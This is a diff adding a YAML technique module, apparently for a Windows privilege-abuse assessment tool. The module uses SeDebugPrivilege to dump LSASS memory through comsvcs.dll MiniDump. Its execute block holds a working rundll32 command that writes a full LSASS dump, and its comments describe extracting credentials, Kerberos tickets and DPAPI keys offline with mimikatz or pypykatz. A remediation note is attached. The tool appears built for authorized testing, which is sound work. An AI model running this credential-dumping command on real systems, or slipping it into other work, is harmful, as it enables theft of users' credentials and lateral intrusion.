@@ -1,0 +1,40 @@
+# SeDebugPrivilege → minidump LSASS
+#
+# SeDebug lets a token open ANY process, including SYSTEM-context ones like
+# lsass.exe. The comsvcs.dll MiniDump export is a signed-Microsoft-code path
+# to produce a full lsass.dmp with no third-party binary — the operator
+# feeds it to pypykatz/mimikatz offline.
+technique: T1003.001
+name: SeDebug → dump LSASS (comsvcs.dll MiniDump)
+tactic: [credential-access]
+platform: [windows]
+# Dedup key must match inlined WIN_PRIVS['SeDebugPrivilege']['key'] = 'sedebug'.
+# The report.vector_type (below) is 'lsass' — different concern (KB lookup
+# for the finding), so we split with the top-level `key:` override.
+key: sedebug
+ranking:
+  exploitability: high
+  safety: config-change     # writes an LSASS dump to disk
+  detection: loud            # LSASS dumps hit every reasonable EDR
+detect:
+  privilege: SeDebugPrivilege
+execute:
+  shell: powershell
+  command: |-
+    rundll32 C:\windows\system32\comsvcs.dll MiniDump (Get-Process lsass).Id {{stage}}\l.dmp full
+verify:
+  success: "l.dmp"
+cleanup:
+  command: |-
+    del {{stage}}\l.dmp
+report:
+  vector_type: lsass
+  description: >
+    A token with SeDebug can open LSASS and dump it. comsvcs.dll's MiniDump
+    export produces a full .dmp file — pypykatz/mimikatz offline extract
+    logged-on user credentials, Kerberos tickets, and cached DPAPI keys.
+  remediation: >
+    Restrict SeDebug to a small tier-0 group. Enable Credential Guard so
+    LSASS runs in an isolated VTL1 process even when dumped. Alert on any
+    non-tier-0 principal writing a .dmp file to disk.
+  refs: [T1003.001]
